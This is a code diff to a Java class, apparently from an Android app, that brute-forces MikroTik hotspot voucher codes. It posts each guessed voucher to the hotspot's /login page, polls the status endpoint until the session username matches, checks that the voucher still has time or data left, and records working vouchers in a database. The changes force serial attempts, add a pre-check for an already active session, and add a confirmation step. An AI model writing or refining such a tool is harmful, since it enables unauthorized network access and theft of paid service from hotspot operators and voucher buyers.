@@ -73,7 +73,7 @@ public class MikrotikFinder {
         this.varDigits = Math.max(1, Math.min(6, varDigits));
         this.maxAttempts = Math.max(1, maxAttempts);
         this.waitMs = Math.max(50, waitMs);
-        this.parallel = Math.max(1, Math.min(10, parallel));
+        this.parallel = 1; // forced serial
         this.relax = relax;
         this.db = db;
     }
@@ -104,7 +104,15 @@ public class MikrotikFinder {
             formTemplate = fields;
             Log.d("NEXORA", "form fields: " + fields.keySet());
 
-            emitProgress("بدء " + parallel + " عمال...");
+            String preCheck = httpGet(base + STATUS_PATH, probe, 5000);
+            if (statusActive(preCheck)) {
+                String preUser = getStr(preCheck, "username");
+                String who = (preUser != null && !preUser.isEmpty() && !preUser.equals("-")) ? preUser : "???";
+                fail("جلسة نشطة (" + who + ") — اخرج من الشبكة أولاً عبر زر فتح صفحة الشبكة");
+                return;
+            }
+
+            emitProgress("بدء المحاولات...");
             for (int i = 0; i < parallel; i++) pool.submit(new Worker(i));
         } catch (Exception e) {
             fail("خطأ تجهيز: " + e.getMessage());
@@ -153,35 +161,38 @@ public class MikrotikFinder {
     private boolean tryLogin(String voucher, WorkerSession session) {
         session.setCookie("username", voucher);
         session.setCookie("password", "");
-        String beforeJson = httpGet(base + STATUS_PATH, session, 5000);
-        long beforeUptime = parseUptime(getStr(beforeJson, "uptime"));
-        boolean beforeActive = statusActive(beforeJson);
 
         String body = buildFormBody(formTemplate, voucher);
         httpPost(base + "/login", body, session, 6000);
+        totalAttempts.incrementAndGet();
 
-        long[] checks = {0, 100, 150, 200, 300, 400, 500, 800};
+        long[] checks = {100, 150, 200, 250, 300, 400, 500, 700};
         for (long d : checks) {
-            if (d > 0) try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
+            try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
             if (!running.get()) return false;
             String afterJson = httpGet(base + STATUS_PATH, session, 4000);
             if (afterJson == null) continue;
-            totalAttempts.incrementAndGet();
             String user = getStr(afterJson, "username");
-            long nowUptime = parseUptime(getStr(afterJson, "uptime"));
-            boolean nowActive = statusActive(afterJson);
-            if (user != null && !user.isEmpty() && user.equals(voucher)) { lastStatusJson = afterJson; db.addFound(voucher, afterJson); return true; }
-            if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) { lastStatusJson = afterJson; db.addFound(voucher, afterJson); return true; }
-            if (nowActive && !beforeActive) { lastStatusJson = afterJson; db.addFound(voucher, afterJson); return true; }
-            emitProgress("");
-        }
-        String getUrl = base + "/login?username=" + enc(voucher) + "&password=&dst=" + enc(base + "/");
-        httpGet(getUrl, session, 5000);
-        try { Thread.sleep(400); } catch (InterruptedException e) { return false; }
-        String fj = httpGet(base + STATUS_PATH, session, 4000);
-        if (fj != null) {
-            String user = getStr(fj, "username");
-            if (user != null && user.equals(voucher)) { lastStatusJson = fj; db.addFound(voucher, fj); return true; }
+            if (user == null || !user.equals(voucher)) { emitProgress(""); continue; }
+
+            try { Thread.sleep(500); } catch (InterruptedException e) {}
+            String confirm = httpGet(base + STATUS_PATH, session, 4000);
+            if (confirm == null) continue;
+            String confirmUser = getStr(confirm, "username");
+            if (!voucher.equals(confirmUser)) continue;
+
+            String left = getStr(confirm, "session_time_left");
+            String remain = getStr(confirm, "remain_bytes_total");
+            long leftSec = parseUptime(left);
+            long remainBytes = -1;
+            try { if (remain != null && !remain.isEmpty()) remainBytes = Long.parseLong(remain); } catch (Exception e) {}
+            boolean leftZero = leftSec == 0 || "00:00:00".equals(left) || "0".equals(left) || "0s".equals(left);
+            boolean remainZero = remainBytes == 0;
+            if (leftZero || remainZero) { emitProgress(""); continue; }
+
+            lastStatusJson = confirm;
+            db.addFound(voucher, confirm);
+            return true;
         }
         return false;
     }
